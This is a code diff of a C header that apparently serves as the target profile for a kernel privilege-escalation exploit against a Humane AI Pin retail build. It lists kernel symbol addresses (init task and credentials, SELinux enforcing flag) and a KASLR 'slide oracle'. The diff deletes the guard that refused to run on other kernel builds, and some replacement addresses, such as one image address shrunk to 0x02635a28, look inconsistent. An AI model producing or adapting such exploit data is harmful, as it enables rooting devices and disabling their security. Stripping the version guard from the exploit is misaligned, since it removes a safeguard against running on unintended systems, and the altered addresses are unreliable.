@@ -1,27 +1,10 @@
-/*
- * Humane AI Pin retail 101.000470.45.20 target profile.
- *
- * These link-time addresses were extracted from the embedded kallsyms table
- * in a chip-off boot_a Image.  The uncompressed Image SHA-256 is
- * d4f4e0deb20871fce207f1f095ba1934162081c2f10afaccbb2e6a1e938719fb
- * and its Linux version string exactly matches the connected retail unit:
- * actions-runner@cc457267f047, clang 10.0.7, Mon Nov 4 18:37:23 PST 2024.
- *
- * All addresses below are link-time image addresses.  Runtime addresses are
- * formed only after the current boot's KASLR base has been recovered.
- */
 #ifndef TARGET_45_20_H
 #define TARGET_45_20_H
 
 #define KIMAGE_TEXT_BASE 0xffffff8008080000ULL
 #define P0_PAGE_OFFSET 0xffffffc000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
-#define P0_KERNEL_PHYS_LOAD 0xa1280000ULL
-
-/* Refuse to run against any other release or kernel build. */
-#define TARGET_KERNEL_RELEASE "Linux version 4.14.190-perf"
-#define TARGET_SLOT_A_VERSION_MARKER "Mon Nov 4 18:37:23 PST 2024"
-#define TARGET_SLOT_B_VERSION_MARKER "Mon Nov 4 18:37:23 PST 2024"
+#define P0_KERNEL_PHYS_LOAD 0x80080000ULL
 
 #define PSELECT_WAITER_WORD_SHIFT 16
 
@@ -33,11 +16,11 @@
 #define TARGET_USE_PSELECT_RESULT_STAMP 1
 
 /* Exact symbols recovered from the retail Image kallsyms table. */
-#define INIT_TASK 0xffffff8009dcdb80ULL
-#define INIT_CRED 0xffffff8009ddeec0ULL
-#define ENTRY_TASK 0xffffff8009b2a0b0ULL
-#define PER_CPU_OFFSET 0xffffff8009dbf6d0ULL
-#define ROOT_TASK_GROUP 0xffffff8009fe9f00ULL
+#define INIT_TASK 0xffffff800a61d980ULL
+#define INIT_CRED 0xffffff800a62ec48ULL
+#define ENTRY_TASK 0xffffff800a2da0b0ULL
+#define PER_CPU_OFFSET 0xffffff800a60e6d0ULL
+#define ROOT_TASK_GROUP 0xffffff800a861e80ULL
 
 /* struct selinux_state begins with initialized, enforcing (two bools). */
 #define SELINUX_ENFORCING 0xffffff800a4cd001ULL
@@ -46,9 +29,9 @@
  * The slide oracle repoints random_table[5].data at loggers[0][1].
  * loggers[0][1] contains &nfulnl_logger after nf_log registration.
  */
-#define SLIDE_NFULNL_LOGGER_IMAGE 0xffffff8009dc37c8ULL
-#define SLIDE_LOGGERS_0_1_IMAGE 0xffffff8009dc36f0ULL
-#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffff8009ea2098ULL
+#define SLIDE_NFULNL_LOGGER_IMAGE 0xffffff800a612e50ULL
+#define SLIDE_LOGGERS_0_1_IMAGE 0xffffff800a612d70ULL
+#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0x02635a28ULL
 #define P0_NFULNL_LOGGER_IMAGE_OFF \
   (SLIDE_NFULNL_LOGGER_IMAGE - KIMAGE_TEXT_BASE)
 
